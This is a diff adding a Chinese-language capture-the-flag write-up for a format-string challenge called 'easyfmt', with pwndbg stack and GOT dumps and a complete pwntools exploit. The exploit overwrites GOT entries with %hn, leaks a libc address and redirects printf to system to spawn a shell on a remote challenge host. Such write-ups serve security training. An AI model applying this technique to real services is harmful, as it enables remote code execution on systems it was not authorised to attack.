@@ -2578,3 +2578,124 @@ if __name__ == '__main__':
     io.sendline(payload)
     io.interactive()
 ```
+
+### 28. easyfmt
+题目：暂无
+
+思路：简单的格式化字符串漏洞。
+
+程序首先会提示输入一个值，然后跟一个随机数比较，如果相等可以进入printf逻辑，由于这个随机数是单字节数，直接爆破就可以了。
+
+printf这里利用方法首先是通过gdb或者ida确定printf调用时栈内容，可以发现字符串的初始位置为第8个参数（前5个参数为寄存器）。
+```python
+pwndbg> stack 30
+00:0000│ rsp      0x7ffe5dff46e0 —▸ 0x7ffe5dff48f8 —▸ 0x7ffe5dff6534 ◂— 0x4c45485300612f2e /* './a' */
+01:0008│          0x7ffe5dff46e8 ◂— 0x100000000
+02:0010│ rdi rsi  0x7ffe5dff46f0 ◂— 0x3125633433343225 ('%2434c%1')
+03:0018│          0x7ffe5dff46f8 ◂— 0x2a2a2a2a6e682430 ('0$hn****')
+04:0020│          0x7ffe5dff4700 —▸ 0x601060 (exit@got.plt) —▸ 0x400726 (exit@plt+6) ◂— push   9 /* 'h\t' */
+05:0028│          0x7ffe5dff4708 ◂— 0xa /* '\n' */
+06:0030│          0x7ffe5dff4710 ◂— 0x0
+```
+
+下一步通过```%x$hn```修改got.exit为main函数中的进入printf那一段逻辑，使得程序调用exit后能够继续运行，这里可以直接逐字节修改，这样payload比较多，通过gdb调试发现got.exit默认值为0x400726,这样只需要修改低位两个字节就可以了。
+```python
+pwndbg> got
+
+GOT protection: Partial RELRO | GOT functions: 11
+ 
+[0x601018] puts@GLIBC_2.2.5 -> 0x7ffff7e64550 (puts) ◂— push   r14
+[0x601020] write@GLIBC_2.2.5 -> 0x4006a6 (write@plt+6) ◂— push   1
+[0x601028] __stack_chk_fail@GLIBC_2.4 -> 0x4006b6 (__stack_chk_fail@plt+6) ◂— push   2
+[0x601030] printf@GLIBC_2.2.5 -> 0x7ffff7e44c50 (printf) ◂— sub    rsp, 0xd8
+[0x601038] read@GLIBC_2.2.5 -> 0x7ffff7edcde0 (read) ◂— mov    eax, dword ptr fs:[0x18]
+[0x601040] __libc_start_main@GLIBC_2.2.5 -> 0x7ffff7e14be0 (__libc_start_main) ◂— push   r15
+[0x601048] srand@GLIBC_2.2.5 -> 0x7ffff7e2cfd0 (srandom) ◂— push   rbp
+[0x601050] time@GLIBC_2.2.5 -> 0x7ffff7fd0a50 (time) ◂— cmp    dword ptr [rip - 0x49d3], -1
+[0x601058] setvbuf@GLIBC_2.2.5 -> 0x7ffff7e64c30 (setvbuf) ◂— push   r14
+[0x601060] exit@GLIBC_2.2.5 -> 0x400726 (exit@plt+6) ◂— push   9 /* 'h\t' */
+[0x601068] rand@GLIBC_2.2.5 -> 0x7ffff7e2d6f0 (rand) ◂— sub    rsp, 8
+```
+
+再通过```%x$s```泄露某个函数的地址，并计算出system函数地址。这里存在几个坑：一是本地调试时使用了kali自带的libc库，导致泄漏出来的函数在LibSearcher中找不到，后面这里通过远程泄漏确定库版本；二是泄漏某些函数不一定能定位到libc库版本，可以换几个其他的函数试一试。
+
+最后通过```%x$hn```修改got.printf为system函数地址，然后调用printf("/bin/sh") getshell。这里有两个技巧：一是printf和system函数地址高字节相同，只需要修改低位4个字节即可；二是不要直接使用`%x$n`直接写4个字节内容，这样需要打印的填充字符串太多导致网络传输很慢，可以拆分成两个`%x$hn`，可以节省需要打印的填充字符串。
+
+全部利用代码如下：
+```python
+from pwn import *
+from LibcSearcher import *
+
+debug = True
+if debug:
+    io = process('./a')
+else:
+    io = remote('220.249.52.134', 30856)
+
+elf = ELF('a')
+
+def check_in():
+    global io
+    while True:
+        io.sendlineafter(':', '0')
+        ret = io.recv()
+        if b'bye' in ret:
+            io.close()
+            if debug:
+                io = process('./a')
+            else:
+                io = remote('220.249.52.134', 30856)
+        else:
+            print(ret)
+            break
+
+if __name__ == '__main__':
+    # brute check in
+    check_in()
+    # gdb.attach(io)
+    # pause()
+
+    # modify got.exit to loop
+    # got.exit init value is 0x400726, only need to modify 0726
+    # loop_addr = 0x400982
+    # index = 8
+    payload = b'%2434c%10$hn****' + p64(elf.got['exit'])
+    print(payload)
+    io.sendline(payload)
+    ret = io.recvuntil(b'slogan:')
+    print(ret)
+
+    # leak puts
+    # index = 9 because of call exit push a rip into stack
+    payload = b'%10$s***' + p64(elf.got['read'])
+    print(payload)
+    io.sendline(payload)
+    ret = io.recvuntil(b'slogan:')
+    print(ret)
+    puts_addr = u64(ret[2:8] + b'\x00\x00')
+    log.success('puts addr: 0x%x' % puts_addr)
+    libc = LibcSearcher('read', puts_addr)
+    libc_addr = puts_addr - libc.dump('read')
+
+    # modify got.printf to system
+    # index = 10
+    system_addr = libc_addr + libc.dump('system')
+    # system_addr = 0x123456
+    system_addr_1 = (system_addr & 0xffff0000) >> 16
+    system_addr_2 = (system_addr & 0xffff)
+    if system_addr_1 > system_addr_2:
+        payload = b'%%%dc%%14$hn%%%dc%%15$hn' % (system_addr_2, system_addr_1 -
+                system_addr_2)
+        payload = payload.ljust(32, b' ')
+        payload += p64(elf.got['printf']) + p64(elf.got['printf'] + 2)
+    else:
+        payload = b'%%%dc%%14$hn%%%dc%%15$hn' % (system_addr_1, system_addr_2 -
+                system_addr_1)
+        payload = payload.ljust(32, b' ')
+        payload += p64(elf.got['printf'] + 2) + p64(elf.got['printf'])
+    print(payload)
+    io.sendline(payload)
+    # ret = io.recvuntil(b'bye')
+    io.sendline(b'/bin/sh\x00')
+    io.interactive()
+```
